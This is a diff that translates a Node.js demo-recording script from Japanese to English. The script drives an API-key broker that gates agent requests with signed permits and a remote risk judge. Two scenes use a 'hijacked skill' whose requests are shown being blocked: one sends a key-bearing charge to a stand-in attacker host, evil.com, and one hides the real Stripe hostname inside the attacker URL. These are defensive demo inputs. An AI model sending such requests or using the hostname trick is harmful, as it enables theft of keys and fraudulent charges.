@@ -1,7 +1,7 @@
 #!/usr/bin/env node
-// デモ画面が読む scenes.json を作る。**作り話は書かない。本番の 0G に実際に投げた応答をそのまま保存する。**
+// Builds the scenes.json the demo page reads. **Nothing is made up: the responses from the live 0G are saved as they came back.**
 //   node record-ui.mjs http://127.0.0.1:8797 http://127.0.0.1:8798
-// 第2引数は「0G に届かない Broker」。STOPPED を本物として録るために要る。
+// The second argument is a Broker that cannot reach 0G. It is needed to record a real STOPPED.
 import { writeFileSync, existsSync } from 'node:fs'
 import { privateKeyToAccount } from 'viem/accounts'
 import { DOMAIN, TYPES, normalize, lines, requestHash } from './src/permit.js'
@@ -45,38 +45,38 @@ const getRepos = { method: 'GET', url: 'https://api.github.com/user/repos', keyR
 const charge = { method: 'POST', url: 'https://api.stripe.com/v1/charges', keyRef: KEY,
   body: JSON.stringify({ amount: 480000, currency: 'usd', transfer_destination: 'acct_unknown' }) }
 
-console.log('録画中（本番の 0G に実際に投げている）…')
-const ok = await shot({ id: 'usual', title: '範囲の中・ふだんの要求', agent: 'リサーチの手伝い',
-  say: 'ふだんの読み取りは、そのまま通る。鍵はこのエージェントに渡っていない。',
-  caption: '0G が「ふだん」と読んだので、立っている許可のまま通る', permit: standing, request: getRepos })
+console.log('recording (these go to the live 0G)…')
+const ok = await shot({ id: 'usual', title: 'inside the scope, a routine request', agent: 'research helper',
+  say: 'A routine read just passes. The key was never handed to this agent.',
+  caption: '0G read it as routine, so it passes on the standing permit', permit: standing, request: getRepos })
 
-await shot({ id: 'heavy', title: '範囲の中だが、中身が重い', agent: '経理の自動化',
-  say: '同じ範囲の中。でも中身が 4,800 ドルの送金で、宛先が知らない口座。',
-  caption: '0G が「決定的」と読んだ。立っている許可では通さない', permit: heavyPermit, request: charge })
+await shot({ id: 'heavy', title: 'inside the scope, but the body is heavy', agent: 'bookkeeping automation',
+  say: 'The same scope. But the body is a $4,800 transfer to an account nobody has seen.',
+  caption: '0G read it as decisive. A standing permit is not enough', permit: heavyPermit, request: charge })
 
-await shot({ id: 'pressed', title: 'その場で一押しした', agent: '経理の自動化',
-  say: '手元の機器に4行が出る。押して初めて、この1回だけが通る。',
-  caption: '使い切り（maxCalls=1）の許可。押さなければ鍵は使われない', permit: pressPermit, request: charge })
+await shot({ id: 'pressed', title: 'pressed right now', agent: 'bookkeeping automation',
+  say: 'The four lines appear on the device in your hand. Only once you press does this one call go through.',
+  caption: 'A single-use permit (maxCalls=1). Without the press the key is not used', permit: pressPermit, request: charge })
 
-await shot({ id: 'denied-host', title: '宣言した範囲を外れた要求', agent: '乗っ取られたスキル',
-  say: '宛先が違う。ここで止まる。しかも、誰が要求したかが署名ごと残る。',
-  caption: '0G には見せていない。範囲外は中身を外に出す前に止める',
+await shot({ id: 'denied-host', title: 'a request outside the declared scope', agent: 'hijacked skill',
+  say: 'The target is wrong. It stops here. And who asked for it stays on the record, signature and all.',
+  caption: '0G never saw it. Out of scope is stopped before the body leaves',
   permit: mk({}), request: { method: 'POST', url: 'https://evil.com/v1/charges', keyRef: KEY } })
 
-await shot({ id: 'denied-sneak', title: 'ホスト名に紛れ込ませた要求', agent: '乗っ取られたスキル',
-  say: 'URL の途中に正しい宛先を混ぜても、通らない。',
-  caption: '文字列ではなくホストで突き合わせている',
+await shot({ id: 'denied-sneak', title: 'a request with the name hidden in the hostname', agent: 'hijacked skill',
+  say: 'Slipping the right target into the middle of the URL does not get through.',
+  caption: 'The match is on the host, not on the string',
   permit: mk({}), request: { method: 'POST', url: 'https://evil.com/api.stripe.com/v1/charges', keyRef: KEY } })
 
 if (DEAF) {
-  await shot({ id: 'stopped', title: '0G に届かないとき', agent: '経理の自動化', base: DEAF,
-    say: '重さを決める相手に届かない。ここで既定値を作らない。止まる。',
-    caption: '偽の判断を作るくらいなら止める。回数も減らない', permit: mk({ maxCalls: 5 }), request: charge })
+  await shot({ id: 'stopped', title: 'when 0G cannot be reached', agent: 'bookkeeping automation', base: DEAF,
+    say: 'The thing that decides the weight is unreachable. No default is invented here. It stops.',
+    caption: 'Better to stop than to fake a judgement. The call budget is untouched', permit: mk({ maxCalls: 5 }), request: charge })
 }
 
-// ── 画面から「いま」投げ直すための、署名済みの本体 ──
-// 画面（ブラウザ）は鍵を持たない。持たせない。だからここで署名したものを渡す。
-// 一押し用は、**1回使い切りの許可を20本**作っておく（押すたびに1本使う。これが実物と同じ形）。
+// ── pre-signed bodies, so the page can re-send them live ──
+// The page (the browser) holds no key, and never will. So we hand it something signed here.
+// For the press case, prepare **20 single-use permits** (one is spent per press; that matches the real thing).
 const bundle = async (permit, request, base = BASE) => ({
   base, request, lines: lines(permit),
   body: {
@@ -101,13 +101,13 @@ const seal = await (await fetch(`${BASE}/seal`, { method: 'POST', headers: { 'co
 const trace = await (await fetch(`${BASE}/trace/${ok.thread}`)).json()
 const health = await (await fetch(`${BASE}/health`)).json()
 
-// 録画の正本は ui/scenes.json。web/ があれば同じものを置く（**2つの録画が食い違わないように**）
+// ui/scenes.json is the source of truth for the recording. If web/ exists, put the same file there (**so the two recordings never disagree**)
 const payload = JSON.stringify({
   recordedAt: new Date().toISOString(),
-  note: '本番の 0G Private Computer（TeeML）に実際に投げた応答をそのまま保存したもの。作り話ではない。',
+  note: 'Responses from the live 0G Private Computer (TeeML), saved exactly as they came back. Nothing is made up.',
   endpoint: health.zg.endpoint, model: health.zg.model, simulated: Boolean(health.zg.simulated),
   scenes, live, seal, trace: { thread: trace.thread, count: trace.records.length, records: trace.records },
 }, null, 2) + '\n'
 writeFileSync(new URL('../ui/scenes.json', import.meta.url), payload)
 if (existsSync(new URL('../web/', import.meta.url))) writeFileSync(new URL('../web/scenes.json', import.meta.url), payload)
-console.log(`\n../ui/scenes.json に ${scenes.length} 場面。root ${seal.rootHash ?? '—'}`)
+console.log(`\n${scenes.length} scenes in ../ui/scenes.json. root ${seal.rootHash ?? '—'}`)
